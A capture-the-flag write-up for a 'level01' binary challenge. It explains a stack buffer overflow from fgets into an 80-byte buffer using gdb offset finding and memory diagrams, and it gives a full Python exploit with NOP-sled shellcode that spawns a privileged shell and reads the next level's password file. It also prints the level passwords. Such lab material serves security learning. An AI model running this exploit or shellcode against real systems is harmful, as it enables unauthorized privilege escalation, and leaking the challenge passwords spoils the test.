# level01 notes
# Problem:
It is a classic stack‑based buffer overflow challenge, fgets(password, 100, stdin) writes into
a local buffer that is smaller than 100 bytes, allowing EIP overwrite.
User input (100 bytes)
│
│ 80 bytes → password buffer
│
└──► overwrite saved EBP
      │
      └──► overwrite saved EIP
              │
              └──► control program execution

# Password buffer
gdb ./level01
(gdb) disas main

HIGH ADDRESSES
┌──────────────────────────────┐
│ Saved EIP                    │  <-- overwritten by "BBBB"
└──────────────────────────────┘
┌──────────────────────────────┐
│ Saved EBP                    │  <-- overwritten by bytes 80–83
└──────────────────────────────┘
┌──────────────────────────────┐
│ Saved EDI + Saved EBX        │  <-- pushed by 8 bytes
└──────────────────────────────┘
┌──────────────────────────────┐
│ Padding / locals (28 bytes)  │  <-- before buffer
│ 0x00–0x1B                    │
└──────────────────────────────┘
┌──────────────────────────────┐
│ password buffer (80 bytes)   │  <-- "A"*80
│ 0x1C–0x6B                    │
└──────────────────────────────┘
LOW ADDRESSES

We do not need to manually place EBP, because:
    It is not used after the function returns
    It doesn't control execution
    Only saved EIP determines where the program jumps

So the exploit only needs to set EIP.

- Total stack allocation = `0x60` = 96 bytes
- Buffer start offset = `0x1c` = 28 bytes
Buffer size = Stack allocation − Offset(from ESP to buffer start) + Pushes + Alignment padding	​
96−28+8+4 = 80 bytes

# RET_ADDR = A_USER_NAME + 20

A_USER_NAME (global buffer in .bss)
┌──────────────────────────────────────────────┐
│ 0–6: "dat_wil"                               │  <-- ASCII, NOT executable
├──────────────────────────────────────────────┤
│ 7: 0x00 (NULL from fgets)                    │  <-- stops string, NOT executable
├──────────────────────────────────────────────┤
│ 8: 0x0A (newline)                            │  <-- NOT executable
├──────────────────────────────────────────────┤
│ 9–19: unpredictable bytes / unsafe region    │  <-- may contain junk
├──────────────────────────────────────────────┤
│ 20–??: NOP sled (0x90 0x90 0x90 ...)          │  <-- SAFE landing zone
├──────────────────────────────────────────────┤
│ shellcode                                     │  <-- actual payload
└──────────────────────────────────────────────┘


1. Copy level01 binary file to host machine
scp -P 4242 level01@192.168.122.1:/home/users/level01/level01 ./Lien-Override/BinaryfromISO/level01

2. Decompiler Explorer:
https://dogbolt.org/?id=d2ff384a-ea37-4370-9ae5-4814118e5725

3. Find OFFSET: 
ssh level01@192.168.122.1 -p 4242
Enter password of level01: 
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test01

gdb ./level01

run < /tmp/test01
info registers

eip            0x42424242
->OFFSET=80

4. Get the address of user_name:
gdb ./level01
(gdb) break main
(gdb) run
(gdb) p &a_user_name
->a_user_name = 0x804a040

5. ssh level01@192.168.122.1 -p 4242
cd /home/users/level01

cat > /tmp/level01.py << 'EOF'
import struct
import sys

A_USER_NAME = 0x0804a040
RET_ADDR = A_USER_NAME + 20
OFFSET = 80

shellcode = (
    "\x31\xc0\xb0\x31\xcd\x80"      # geteuid()
    "\x89\xc3\x89\xc1"              # ebx = eax, ecx = eax
    "\x31\xc0\xb0\x46\xcd\x80"      # setreuid(euid, euid)
    "\x31\xc0\x50"                  # push NULL
    "\x68\x2f\x2f\x73\x68"          # push "//sh"
    "\x68\x2f\x62\x69\x6e"          # push "/bin"
    "\x89\xe3\x50\x53\x89\xe1"      # ebx="/bin//sh", argv
    "\x99\xb0\x0b\xcd\x80"          # execve("/bin/sh", argv, NULL)
)

username = "dat_wil" + "\x90" * 100 + shellcode
password = "A" * OFFSET + struct.pack("<I", RET_ADDR)

payload = username + "\n" + password + "\n"

sys.stdout.write(payload)
EOF

6. (python /tmp/level01.py; echo "id"; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
OR ((python /tmp/level01.py; cat) | ./level01
id
whoami
cat /home/users/level02/.pass)

OR
python3 level01.py
scp -P 4242 payload_level01 level01@192.168.122.1:/tmp/payload_level01

7. Password of level02: cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

HIGH ADDRESSES
================================================================================
|                                STACK (grows downward)                        |
|                                                                                |
|  Saved EIP                    ← overwritten by RET_ADDR                        |
|  Saved EBP                    ← overwritten by bytes 80–83                     |
|  Saved EDI                    ← pushed by compiler                             |
|  Saved EBX                    ← pushed by compiler                             |
|                                                                                |
|  Padding / locals (0x00–0x1B) = 28 bytes                                       |
|                                                                                |
|  Password buffer (starts at esp + 0x1C)                                        |
|     buf[0]   = esp + 0x1C                                                      |
|     buf[79]  = esp + 0x6B                                                      |
|     Effective size = 80 bytes                                                  |
|                                                                                |
|  ↓ stack grows downward (toward lower addresses)                               |
================================================================================
|                                HEAP (grows upward)                            |
|                                                                                |
|  Level01 does NOT use heap                                                     |
|  No malloc(), calloc(), realloc(), free()                                      |
|                                                                                |
|  Heap exists but is unused                                                     |
================================================================================
|                                .bss (global variables)                        |
|                                                                                |
|  A_USER_NAME at 0x804a040                                                      |
|                                                                                |
|  0x804a040: "dat_wil"                                                          |
|  0x804a047: 0x00 (NULL)                                                        |
|  0x804a048: 0x0A (newline)                                                     |
|  0x804a049–0x804a053: junk / unsafe                                            |
|                                                                                |
|  0x804a054: start of NOP sled                                                  |
|  0x804a054+: shellcode                                                         |
|                                                                                |
|  RET_ADDR = A_USER_NAME + 20 = 0x804a054                                       |
================================================================================
|                                .data                                           |
|                                                                                |
|  0x804a020: pointer to stdin                                                   |
|  other global pointers                                                         |
================================================================================
|                                .text (code)                                    |
|                                                                                |
|  main()                                                                        |
|  verify_user_name()                                                            |
|  verify_user_pass()                                                            |
|  PLT stubs (printf, fgets, puts, etc.)                                         |
|                                                                                |
|  Vulnerability:                                                                |
|     fgets(buf, 100) writes into 80‑byte buffer                                 |
|     → overwrite saved EBP                                                      |
|     → overwrite saved EIP                                                      |
================================================================================
LOW ADDRESSES
